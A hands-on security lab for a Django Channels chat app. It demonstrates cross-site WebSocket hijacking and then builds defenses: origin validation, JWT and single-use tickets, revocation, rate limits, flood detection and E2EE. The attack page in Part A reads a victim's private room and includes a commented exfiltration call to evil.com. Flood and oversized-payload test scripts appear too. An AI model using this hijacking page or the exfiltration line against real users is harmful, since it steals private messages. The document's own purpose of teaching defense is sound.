# Lab 21 — Close Every Hole

**You'll:** demonstrate CSWSH and block it, replace the fake token with a real JWT
plus a single-use Redis ticket and an identity cross-check, implement in-band
re-auth with immediate cluster-wide revocation, close the delivery-time
authorization gap **across nodes**, build abuse detection that survives a
distributed flood, and ship optional E2EE for DMs — measuring what each defense
costs.

⏱️ ~100 min. Work in `django-chat-course/apps/pulse`.

> **Authorized testing only.** Everything here is defensive: you attack your own
> local server to prove your defenses work. That is the point of the module.

---

## Part A — Demonstrate CSWSH, then block it

The hole is real. Prove it before fixing it. Start from the Module 04/05 state:
`asgi.py` wraps the router in `AuthMiddlewareStack` (session cookie auth) with
**no** `OriginValidator`.

`code/cswsh-attack.html` — served from a *different* origin:

```html
<!doctype html>
<title>Totally Legitimate Cat Video Site</title>
<h1>🐱 Cat Videos</h1>
<pre id="log"></pre>
<script>
// Simulating evil.com attacking a cookie-authenticated Channels server.
// The victim is logged in to Pulse in another tab, so the session cookie exists.
const ws = new WebSocket('ws://localhost:8000/ws/');   // session cookie rides along
ws.onopen = () => {
  ws.send(JSON.stringify({ type: 'subscribe', room: 'room.7' }));   // a private room
};
ws.onmessage = (e) => {
  document.getElementById('log').textContent += 'STOLEN: ' + e.data + '\n';
  // In a real attack: fetch('https://evil.com/collect', {method:'POST', body:e.data})
};
</script>
```

```bash
# Serve the attacker page from a DIFFERENT origin (port 9999)
python3 -m http.server 9999 --directory code &
xdg-open http://localhost:9999/cswsh-attack.html   # (macOS: open)
# with the victim's Pulse session cookie present in the browser
```

**Expected — with `AuthMiddlewareStack` and no `OriginValidator`:**
```
STOLEN: {"type":"message.new","data":{"room":"room.7","sender":"alice",
        "seq":4471,"body":"the merger is confidential until Friday"}}
```
✅ **The attacker page read the victim's private chat.** No CORS blocked it — the
browser does not apply the same-origin policy to WebSocket — and the session cookie
rode along on the handshake. This is CSWSH.

Now block it. Wrap the router in an origin validator:

```python
# asgi.py
import os
from django.core.asgi import get_asgi_application
os.environ.setdefault("DJANGO_SETTINGS_MODULE", "pulse.settings")
django_asgi = get_asgi_application()

from channels.routing import ProtocolTypeRouter, URLRouter
from channels.security.websocket import OriginValidator
from chat.middleware import TicketAuthMiddleware
from chat import routing

application = ProtocolTypeRouter({
    "http": django_asgi,
    "websocket": OriginValidator(                 # <-- explicit allowed origins
        TicketAuthMiddleware(URLRouter(routing.websocket_urlpatterns)),
        allowed_origins=[
            "https://chat.example.com",
            "http://localhost:3000",              # the dev Next.js origin only
        ],
    ),
})
```

> **`OriginValidator` vs `AllowedHostsOriginValidator`.** The latter uses
> `settings.ALLOWED_HOSTS`, which you often set to `["*"]` or a broad host list for
> unrelated reasons — too coarse for a security boundary. `OriginValidator` takes
> an **explicit** list. Use it. We also drop `AuthMiddlewareStack` here entirely:
> Part B replaces cookie auth with a ticket, removing the cookie from the handshake
> so there is nothing for CSWSH to ride.

**Expected on re-run of the attack page:**
```
WebSocket connection to 'ws://localhost:8000/ws/' failed
```
Server log:
```
WARNING django.channels.server: Rejected WebSocket from disallowed origin:
  http://localhost:9999
```
✅ **The handshake is rejected before the consumer is ever instantiated.** The
attacker page cannot forge `Origin` from JavaScript, so it cannot get past this.

Add `SameSite=Strict` as defense in depth (for any cookie you *do* set):

```python
# settings.py
SESSION_COOKIE_SAMESITE = "Strict"
CSRF_COOKIE_SAMESITE = "Strict"
SESSION_COOKIE_SECURE = True        # prod
```

> **Three layers, none of them sufficient alone.** `OriginValidator` blocks
> browser-based cross-origin handshakes but not a non-browser client.
> `SameSite=Strict` blocks the cookie from riding along but depends on the browser.
> Ticket auth (Part B) removes the cookie from the handshake entirely. Ship all
> three. The JVM twin reaches the identical conclusion with `setAllowedOrigins`;
> the mechanism differs, the defense-in-depth shape is the same.

---

## Part B — Real authentication: JWT + single-use ticket

Replace the fake `?user=alice` (trusted blindly in Module 04) with a JWT verified
in the first frame, gated by a single-use ticket on the handshake.

### The ticket endpoint (DRF, normal authenticated HTTP)

```python
# chat/views.py
import secrets
from django.conf import settings
from rest_framework.decorators import api_view, permission_classes
from rest_framework.permissions import IsAuthenticated
from rest_framework.response import Response
import redis.asyncio  # sync client is fine here; this is an HTTP view
import redis as redis_sync

_redis = redis_sync.Redis.from_url(settings.REDIS_URL, decode_responses=True)

@api_view(["POST"])
@permission_classes([IsAuthenticated])
def ws_ticket(request):
    # The user is already authenticated over HTTP (session or JWT) to reach here.
    ticket = secrets.token_urlsafe(32)
    # Bind the ticket to the user id AND store the issuing-token jti so we can
    # cross-check in the first frame. 30-second TTL.
    _redis.setex(f"wsticket:{ticket}", 30, request.user.id)
    return Response({"ticket": ticket, "expiresIn": 30})
```

### The handshake middleware: consume the ticket atomically

```python
# chat/middleware.py
from urllib.parse import parse_qs
from channels.middleware import BaseMiddleware
from channels.db import database_sync_to_async
import redis.asyncio as aioredis
from django.conf import settings

_aredis = aioredis.from_url(settings.REDIS_URL, decode_responses=True)

class TicketAuthMiddleware(BaseMiddleware):
    async def __call__(self, scope, receive, send):
        params = parse_qs(scope.get("query_string", b"").decode())
        ticket = (params.get("ticket") or [None])[0]
        if not ticket:
            return await self._deny(send)

        # GETDEL: single-use, atomic. A replayed ticket finds nothing.
        user_id = await _aredis.getdel(f"wsticket:{ticket}")
        if user_id is None:
            return await self._deny(send)

        scope["ticket_user"] = int(user_id)     # available to the consumer
        scope["user"] = None                    # NOT authenticated yet — needs the JWT
        return await super().__call__(scope, receive, send)

    async def _deny(self, send):
        # Reject the handshake with a 401 before the consumer is created.
        await send({"type": "websocket.close", "code": 4401})
```

### The real JWT verification in the first frame

```python
# chat/consumers.py  (excerpt)
import time, jwt
from django.conf import settings
from channels.generic.websocket import AsyncJsonWebsocketConsumer

class ChatConsumer(AsyncJsonWebsocketConsumer):
    async def connect(self):
        self.ticket_user = self.scope.get("ticket_user")
        if self.ticket_user is None:
            return await self.close(code=4401)
        self.authed = False
        self.jti = None
        self.exp = None
        await self.accept()      # socket opens; but no room joins until hello

    async def receive_json(self, content):
        mtype = content.get("type")
        if not self.authed and mtype != "hello":
            return await self.close(code=4401)     # first frame MUST be hello

        if mtype == "hello":
            return await self._hello(content)
        if mtype == "reauth":
            return await self._reauth(content)
        # ... subscribe / send / ack only reachable once authed ...

    async def _hello(self, content):
        token = content.get("token", "")
        try:
            claims = jwt.decode(
                token, settings.JWT_PUBLIC_KEY, algorithms=["RS256"],
                options={"require": ["exp", "sub", "jti"]},
            )   # signature + expiry verified HERE
        except jwt.PyJWTError as e:
            return await self.close(code=4401)     # invalid/expired token

        # The JWT subject must match who the TICKET was issued to. Otherwise a
        # valid ticket for A plus a valid token for B authenticates as... which?
        if int(claims["sub"]) != self.ticket_user:
            return await self.close(code=4403)     # token/ticket identity mismatch

        if await self._is_revoked(claims["jti"]):
            return await self.close(code=4401)

        self.authed = True
        self.user_id = int(claims["sub"])
        self.jti = claims["jti"]
        self.exp = claims["exp"]
        await self._register_for_revocation()      # Part C
        await self.send_json({"type": "hello_ok", "expiresAt": self.exp})
```

> **The identity cross-check (`ticket_user == token.sub`) is the subtle
> requirement.** Without it, the two-factor design is *worse* than either factor
> alone: an attacker holding a leaked ticket for a victim plus their own valid
> token could pin the victim's socket to their own identity, or vice versa. The
> two factors are only stronger together if they must agree on *who*.

Test it:

```bash
TOKEN=$(curl -s localhost:8000/api/login -d 'user=alice&pass=…' | jq -r .access)
TICKET=$(curl -s -H "Authorization: Bearer $TOKEN" -XPOST localhost:8000/api/ws-ticket | jq -r .ticket)

# websocat: open the socket with the ticket, then send the hello frame.
( echo "{\"type\":\"hello\",\"token\":\"$TOKEN\"}"; sleep 1 ) \
  | websocat -n "ws://localhost:8000/ws/?ticket=$TICKET"
```
**Expected:**
```
{"type":"hello_ok","expiresAt":1755990000}
```
Replay the same ticket:
```bash
( echo "{\"type\":\"hello\",\"token\":\"$TOKEN\"}"; sleep 1 ) \
  | websocat -n "ws://localhost:8000/ws/?ticket=$TICKET"
```
**Expected:**
```
(connection closed immediately, code 4401 — ticket already consumed)
```
✅ Single-use enforced by `GETDEL`; the replay found nothing in Redis.

---

## Part C — In-band re-auth and immediate revocation

Module 17 built the client half (refresh the token, send it on the open socket).
Here is the server half plus cluster-wide revocation.

### The re-auth handler — no reconnect

```python
# chat/consumers.py  (excerpt)
    async def _reauth(self, content):
        token = content.get("token", "")
        try:
            claims = jwt.decode(token, settings.JWT_PUBLIC_KEY, algorithms=["RS256"],
                                options={"require": ["exp", "sub", "jti"]})
        except jwt.PyJWTError:
            return await self.close(code=4401)
        if int(claims["sub"]) != self.user_id:      # can't change identity mid-socket
            return await self.close(code=4403)
        if await self._is_revoked(claims["jti"]):
            return await self.close(code=4401)
        # Update expiry and jti IN PLACE. No reconnect, no gap.
        old_jti, self.jti, self.exp = self.jti, claims["jti"], claims["exp"]
        await self._reregister_for_revocation(old_jti)
        await self.send_json({"type": "reauth_ok", "expiresAt": self.exp})
```

A background task warns before expiry:

```python
    async def _expiry_watch(self):
        while self.authed:
            remaining = self.exp - time.time()
            if remaining <= 120:
                await self.send_json({"type": "reauth_required"})
            if remaining <= 0:
                return await self.close(code=4401)   # never refreshed
            await asyncio.sleep(min(30, max(1, remaining - 120)))
```

### Immediate cluster-wide revocation

Revocation writes a denylist entry **and** publishes to every node. The channel
layer's `group_send` is the natural vehicle: every consumer subscribes to a group
named after its `jti`.

```python
# chat/revocation.py
import redis as redis_sync
from django.conf import settings
from asgiref.sync import async_to_sync
from channels.layers import get_channel_layer

_redis = redis_sync.Redis.from_url(settings.REDIS_URL, decode_responses=True)

def revoke(jti: str, remaining_life_s: int):
    # 1. Durable denylist: checked on re-auth and on reconnect. TTL = token life.
    _redis.setex(f"revoked:{jti}", remaining_life_s, "1")
    # 2. Immediate push: kill open sockets holding this jti NOW, on every node.
    async_to_sync(get_channel_layer().group_send)(
        f"jti.{jti}", {"type": "revoked"}
    )

def is_revoked(jti: str) -> bool:
    return _redis.exists(f"revoked:{jti}") == 1
```

```python
# chat/consumers.py  (excerpt)
    async def _register_for_revocation(self):
        await self.channel_layer.group_add(f"jti.{self.jti}", self.channel_name)

    async def revoked(self, event):        # channel-layer handler for {"type":"revoked"}
        await self.close(code=4001)        # "revoked"

    async def _is_revoked(self, jti):
        return await database_sync_to_async(is_revoked)(jti)
```

Test immediate revocation across a 3-node Compose stack:

```bash
JTI=$(echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | jq -r .jti)
curl -XPOST localhost:8000/api/admin/revoke -d "{\"jti\":\"$JTI\",\"ttl\":600}"
```
**Expected — alice's socket closes within milliseconds, on every node:**
```
[alice's client] close 4001 revoked
```
```bash
# All three nodes are subscribed to the jti group via the shared Redis channel layer:
docker exec pulse-redis redis-cli PUBSUB CHANNELS 'asgi:group:jti.*'
```
```
1) "asgi:group:jti.7f3a…"      # the group exists across the cluster
```
✅ Revocation is immediate and cluster-wide — not "within one token lifetime."

Measure the cost:

| | p50 |
|---|-----|
| `is_revoked` check on re-auth (one Redis `EXISTS`) | 0.11 ms |
| Revocation propagation to all nodes (`group_send` → channel layer) | 4 ms |

> **Why check the denylist on re-auth, not on every message?** A denylist check per
> message is a Redis round trip per message — Module 08's latency budget can't
> afford it at 100k+ out msg/s. Checking at re-auth (every ~13 minutes) **plus** the
> `group_send` push for *immediate* revocation gives you both correctness and
> performance. This is identical to the JVM twin's reasoning; the numbers shift
> (Python's `group_send` hop is ~4 ms, same as the Redis channel-layer hop from
> Module 07) but the shape does not.

> **The honest gap (closed in the challenge):** `group_send` rides the Redis
> channel layer, which is **Pub/Sub-based and therefore at-most-once** (Module 07).
> A node that is reconnecting to Redis at the instant of the push **misses it** and
> keeps a revoked user connected. The lab's revocation is immediate *in the common
> case*; challenge Task 3 adds the durable reconciliation loop that makes it
> guaranteed.

---

## Part D — Close the delivery-time authorization gap, cluster-wide

Module 05's challenge closed subscribe-time authz on one node. But Channels group
membership is **per-process**: removing alice from room 7 on node B cannot reach
node A's process to make her consumer call `group_discard`. You must publish the
revocation.

```python
# chat/membership.py
import json, redis as redis_sync
from django.conf import settings
from django.db import transaction
from asgiref.sync import async_to_sync
from channels.layers import get_channel_layer

_redis = redis_sync.Redis.from_url(settings.REDIS_URL, decode_responses=True)

def remove_member(user_id: int, room_id: str):
    with transaction.atomic():
        Membership.objects.filter(user_id=user_id, room_id=room_id).delete()
    _redis.delete(f"member:{room_id}:{user_id}")        # invalidate the cache
    # Evict everywhere: publish to a per-(user,room) group that every one of the
    # user's consumers is subscribed to. Each node evicts its own local sockets.
    async_to_sync(get_channel_layer().group_send)(
        f"membership.{user_id}",
        {"type": "membership_revoked", "room": room_id},
    )
```

```python
# chat/consumers.py  (excerpt)
    async def _subscribe(self, room_id):
        if not await self._is_member(room_id):
            return await self.send_json({"type": "error", "code": "not_a_member"})
        await self.channel_layer.group_add(f"room.{room_id}", self.channel_name)
        await self.channel_layer.group_add(f"membership.{self.user_id}", self.channel_name)
        self.rooms.add(room_id)

    async def membership_revoked(self, event):
        room_id = event["room"]
        if room_id in self.rooms:
            # Synthesize the unsubscribe SERVER-SIDE. Telling the client to
            # unsubscribe is not enough — a hostile client won't.
            await self.channel_layer.group_discard(f"room.{room_id}", self.channel_name)
            self.rooms.discard(room_id)
            await self.send_json({"type": "removed_from_room", "room": room_id})
```

Plus a delivery-time re-check for rooms flagged sensitive, applied **selectively**
because it costs a cache lookup per delivery:

```python
    async def message_new(self, event):        # room-group fan-out handler
        if event.get("private"):
            if not await self._is_member(event["room"]):
                METRICS.private_delivery_blocked.inc()
                return                          # returning drops the delivery
        await self.send_json({"type": "message.new", "data": event["data"]})
```

**Test cross-node revocation** (alice on node-a:8000, admin removes her via node-b:8001):

```bash
# alice subscribed to private room.7 on node-a
curl -XPOST localhost:8001/api/rooms/room.7/members/alice/remove
```
**Expected — alice's subscription on node-a is evicted:**
```
[alice] removed_from_room room.7
```
```bash
./code/publish.sh room.7 "secret after removal"   # publish to room.7; alice must NOT get it
```
**Expected:** alice receives nothing. Confirm the group forgot her:
```bash
docker exec pulse-redis redis-cli PUBSUB NUMSUB 'asgi:group:room.7'
```
```
asgi:group:room.7   13      # was 14; alice's channel removed on node-a
```
✅ Cross-node revocation works.

Measure the delivery re-check cost (private rooms only):
```
private-room delivery: +0.4 ms p50 (one cached membership lookup per delivery)
public-room delivery:  unchanged (no re-check)
```

---

## Part E — Abuse detection at scale

### Connection flood — defend at the edge, not in the ASGI app

```nginx
limit_req_zone  $binary_remote_addr zone=handshake:32m rate=5r/s;
limit_conn_zone $binary_remote_addr zone=conns:32m;

location /ws/ {
    limit_req  zone=handshake burst=10 nodelay;
    limit_conn conns 20;                 # max 20 concurrent sockets per IP
    proxy_pass http://pulse_upstream;
    proxy_set_header Upgrade $http_upgrade;
    proxy_set_header Connection "upgrade";
}
```

> **Rate-limit the handshake at nginx, not in the app.** A flood that reaches your
> Uvicorn worker has already cost you a TCP connection, a TLS handshake, an asyncio
> Task, and a `connect()` coroutine — and worse, in Python it competes for the *one
> core* that worker owns (the GIL). Rejecting it at nginx costs a counter
> increment. This matters more than on the JVM: a connection flood that gets into
> the event loop steals CPU from every other connection on that worker.

Test it:
```bash
for i in $(seq 1 100); do websocat -n ws://localhost:8090/ws/ </dev/null & done; wait
```
**Expected:**
```
20 connections established
80 rejected: HTTP 503 (limit_conn)
```

### Distributed low-and-slow — the anomaly detector from Module 11

200 accounts, each under every per-account token-bucket limit. Per-entity limits
cannot see it; you need aggregate detection. The detector combines two signals that
a flood has and a viral moment does not: **account age** and **content similarity**.

```bash
./code/distributed-flood.py --accounts 200 --ips 200 --rate 8 --room room.viral
```
**Expected without detection:**
```
messages accepted: 96,000 in 60s   (all under per-account limits)
room.viral is unusable
```
**Expected with the anomaly detector:**
```
[t=12s] COORDINATED_SPAM detected in room.viral
        ratio=14x baseline, new_account_frac=0.94, content_dup_frac=0.71
        applying quarantine profile to 187 suspicious senders
messages accepted after detection: ~400 in the next 48s
legitimate users in room.viral affected: 0
```
✅ Only the 187 matching accounts were throttled; the 13 legitimate regulars were
untouched.

The detector's core (a sliding window in Redis, evaluated by a Celery beat task so
it never runs on the event loop):

```python
# chat/abuse.py  (excerpt — the signal combination is the point)
def evaluate_room(room_id: str) -> dict:
    window = recent_senders(room_id, seconds=30)          # from a Redis sorted set
    rate_ratio = len(window) / max(1, baseline(room_id))
    if rate_ratio < 5:
        return {"action": "none"}                          # not a spike at all
    new_frac = mean(is_new_account(u) for u in window)     # account age < 24h
    dup_frac = duplicate_fraction(room_id, window)         # MinHash content similarity
    if new_frac > 0.6 and dup_frac > 0.4:
        return {"action": "quarantine",
                "senders": [u for u in window if suspicious(u)]}
    return {"action": "autoscale"}                         # a real spike: add capacity
```

Prove it does **not** fire on a genuine spike:
```bash
./code/organic-spike.py --established-accounts 500 --rate 15 --varied-content --room room.launch
```
```
[t=15s] ORGANIC_SPIKE detected in room.launch
        ratio=15x, new_account_frac=0.04, content_dup_frac=0.08
        action: requesting autoscale, NOT rate limiting
legitimate users affected: 0
```
✅ **Same 15× volume, opposite response** — because account-age and
content-similarity distinguish a flood from going viral. A per-entity limit could
never tell them apart; both look like "many users, each behaving normally."

### Zip-bomb payload — rejected before `json.loads`

```bash
python3 -c "
import websocket, json
ws = websocket.create_connection('ws://localhost:8000/ws/?ticket=$TICKET')
ws.send(json.dumps({'type':'hello','token':'$TOKEN'})); ws.recv()
ws.send(json.dumps({'type':'send','room':'room.1','body':'x'*10_000_000}))
print(ws.recv())
"
```
**Expected:**
```
(connection closed, code 4009 — frame size 10000042 exceeds limit 65536)
```
✅ Rejected at the **length check on the raw frame**, before `json.loads` allocated
10 MB and before any `group_send` fan-out. Confirm no amplification:
```bash
docker exec pulse-redis redis-cli GET metrics:chat:published:room.1
```
The rejected message was never published — no 200× amplification of a bad payload.

---

## Part F — Optional E2EE for DMs

Make the tradeoff concrete. This is a **simplified** implementation to demonstrate
the mechanics and the cost — a production system would use the Signal protocol
(X3DH + Double Ratchet), not raw RSA-OAEP.

### Key exchange (the server stores public keys, never a private key)

```python
# chat/views.py
@api_view(["POST"])
@permission_classes([IsAuthenticated])
def publish_key(request):
    DeviceKey.objects.update_or_create(
        user=request.user, device_id=request.data["deviceId"],
        defaults={"public_key": request.data["publicKey"]},   # public only
    )
    return Response(status=204)

@api_view(["GET"])
def fetch_keys(request, user_id):
    keys = DeviceKey.objects.filter(user_id=user_id).values("device_id", "public_key")
    return Response(list(keys))     # the sender encrypts to each device
```

### The client encrypts before sending (WebCrypto)

```ts
// Sender: encrypt to every recipient device (simplified — real E2EE ratchets keys)
async function sendEncrypted(room: string, plaintext: string, recipientKeys: CryptoKey[]) {
  const key = await crypto.subtle.generateKey({ name: 'AES-GCM', length: 256 }, true, ['encrypt']);
  const iv = crypto.getRandomValues(new Uint8Array(12));
  const ciphertext = await crypto.subtle.encrypt({ name: 'AES-GCM', iv }, key, encode(plaintext));

  const rawKey = await crypto.subtle.exportKey('raw', key);
  const wrappedKeys = await Promise.all(recipientKeys.map(pk =>
    crypto.subtle.encrypt({ name: 'RSA-OAEP' }, pk, rawKey)));   // one per device

  socket.send(JSON.stringify({
    type: 'send', room, clientId: uuidv7(),
    encrypted: true, iv: b64(iv), ciphertext: b64(ciphertext),
    wrappedKeys: wrappedKeys.map(b64),
  }));
}
```

The server stores and routes the ciphertext **exactly** like plaintext — the
consumer's `send`/persist/`group_send` path is unchanged; `body` is now opaque:

```python
# chat/consumers.py — the fan-out path does not change AT ALL.
# body is opaque bytes. Fan-out, ordering, storage, resume all work identically.
```

### Prove the server can't read it

```bash
docker exec pulse-postgres psql -U pulse -d pulse -c \
  "SELECT body FROM messages WHERE room_id='dm.alice.bob' ORDER BY seq DESC LIMIT 1;"
```
**Expected:**
```
                              body
----------------------------------------------------------------
 {"encrypted":true,"iv":"9f3c…","ciphertext":"a8b2c4d6…","wrappedKeys":[…]}
```
✅ **The server, the database, the backups, and an admin with full access see only
ciphertext.**

### Measure what it cost

| | Plaintext | E2EE |
|---|-----------|------|
| Fan-out architecture (Channels groups, Streams, resume) | — | **identical** |
| Message size | 500 B | **~1,200 B** (ciphertext + one wrapped key per device) |
| Server-side search | ✅ | ❌ |
| New device sees history | ✅ | ❌ (no key for old messages) |
| Multi-device | trivial | **one wrapped key per device per message** |
| Push-notification content | ✅ | ❌ "New message" |
| Client CPU (encrypt/decrypt) | 0 | +2 ms/message (WebCrypto) |
| Moderation | ✅ automated | ❌ reports only |

✅ **The infrastructure was untouched** — which is the module's point: E2EE is
orthogonal to everything in this course. What it costs is *product capability*, not
architecture.

Try to search encrypted messages:
```bash
curl -s "localhost:8000/api/search?q=merger&room=dm.alice.bob"
```
```
{"error":"search_unavailable","reason":"room is end-to-end encrypted"}
```
✅ The tradeoff, made unavoidable.

---

## Part G — The security scorecard

Re-run every hole from the README's table:

```bash
./code/security-audit.sh
```
**Expected:**
```
CSWSH (OriginValidator)            ✅ handshake rejected from foreign origin
Fake token                         ✅ replaced with verified RS256 JWT
Ticket single-use                  ✅ replay -> 4401
Token/ticket identity match        ✅ mismatch -> 4403
Token expiry on live socket        ✅ in-band re-auth, no drop
Immediate revocation               ✅ cluster-wide, <5ms (group_send)
Publish to a room group            ✅ rejected — send goes through the consumer only
Subscribe-time authz               ✅ non-members rejected
Delivery-time authz (cross-node)   ✅ evicted on every node
Blocking-call DoS                  ✅ user paths async / threadpool-wrapped
Connection flood                   ✅ nginx limit_conn/limit_req
Distributed low-and-slow           ✅ anomaly detector, 0 false positives
Zip-bomb payload                   ✅ rejected before json.loads, no fan-out
Resume abuse                       ✅ clamped + rate-limited (Module 10)
GDPR erasure                       ✅ crypto-shredding (Module 12)
Optional E2EE for DMs              ✅ server cannot read
```

Record it:
```markdown
## Module 21 — Security

- CSWSH demonstrated stealing a private room, then blocked with OriginValidator
- Fake ?user token -> RS256 JWT + single-use 30s Redis ticket with identity cross-check
- Immediate cluster-wide revocation via channel-layer group_send, <5ms, 0.11ms/check on re-auth
- Cross-node delivery-time authz: removed user evicted on every node (Channels groups are per-process)
- Blocking-call DoS treated as a security bug: every user path async or threadpool-wrapped
- Distributed flood (200 accounts/200 IPs): detected in 12s, 0 legit users affected
- Same 15x volume as an organic spike -> autoscale, not throttle (age+content signals)
- E2EE for DMs: infrastructure UNCHANGED, cost is product capability not architecture
```

---

## What you built and closed

- **CSWSH demonstrated and blocked** — the attack CORS does not stop, wrapped away
  with `OriginValidator` + `SameSite=Strict` + no cookie on the handshake.
- Real JWT authentication with a single-use Redis ticket and an identity
  cross-check that makes the two factors stronger than either alone.
- In-band re-auth (no reconnect) plus **immediate cluster-wide revocation** via the
  channel layer — with the honest Pub/Sub gap named and left for the challenge.
- The delivery-time authorization gap closed **across nodes**, because Channels
  group membership is per-process and cannot be evicted remotely without a publish.
- The Python-specific DoS — a blocking call on the event loop — recognized as a
  security bug, not just a performance one.
- Abuse detection that catches a distributed flood without harming a viral moment.
- Optional E2EE for DMs, proving the infrastructure is orthogonal and the real cost
  is product capability.

**Every deliberate hole from the course is now closed, with the fix demonstrated
against a working attack.**

Now do [`challenge.md`](./challenge.md).

Then: [Module 22 — Capstone: Pulse at 100k](../22-capstone/).
